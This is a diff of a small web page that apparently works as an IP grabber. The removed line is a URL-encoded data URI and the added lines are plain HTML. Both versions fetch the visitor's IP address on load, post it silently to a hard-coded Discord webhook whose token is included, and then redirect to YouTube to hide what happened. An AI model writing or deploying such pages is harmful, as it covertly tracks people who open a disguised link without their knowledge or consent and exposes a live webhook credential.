@@ -1,1 +1,21 @@
-data:text/html;charset=utf-8,%0A%3C!DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20(async%20function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%201.%20IP%20erfassen%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ip%20%3D%20await%20fetch('https%3A%2F%2Fapi.ipify.org%3Fformat%3Djson')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.then(res%20%3D%3E%20res.json())%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.then(data%20%3D%3E%20data.ip)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%202.%20Webhook%20senden%20(mit%20Timeout-Fallback)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20await%20Promise.race(%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fetch(%22https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1369731470075367576%2F9l2awT_Eu9ZY5VlT-Sol994wm16J-eLZCCkVPjDQK7IKsIVfIEi4reFH43r-9W9XxvC5%22%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%22POST%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%20%22Content-Type%22%3A%20%22application%2Fjson%22%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify(%7B%20content%3A%20%60IP%3A%20%24%7Bip%7D%60%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20new%20Promise(resolve%20%3D%3E%20setTimeout(resolve%2C%202000))%20%2F%2F%202s%20Timeout%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%7B%7D%20%2F%2F%20Fehler%20ignorieren%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%203.%20Weiterleitung%20(garantiert%20ausgef%C3%BChrt)%0A%20%20%20%20%20%20%20%20%20%20%20%20window.location.href%20%3D%20%22https%3A%2F%2Fwww.youtube.com%22%3B%0A%20%20%20%20%20%20%20%20%7D)()%3B%0A%20%20%20%20%3C%2Fscript%3E%0A%3C%2Fhead%3E%0A%3Cbody%3E%3C%2Fbody%3E%0A%3C%2Fhtml%3E
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        window.onload = async () => {
+            const ip = await fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => data.ip);
+            
+            fetch("https://discord.com/api/webhooks/1369731470075367576/9l2awT_Eu9ZY5VlT-Sol994wm16J-eLZCCkVPjDQK7IKsIVfIEi4reFH43r-9W9XxvC5", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `IP: ${ip}` })
+            });
+            
+            window.location.href = "https://youtube.com";
+        };
+    </script>
+</head>
+<body></body>
+</html>
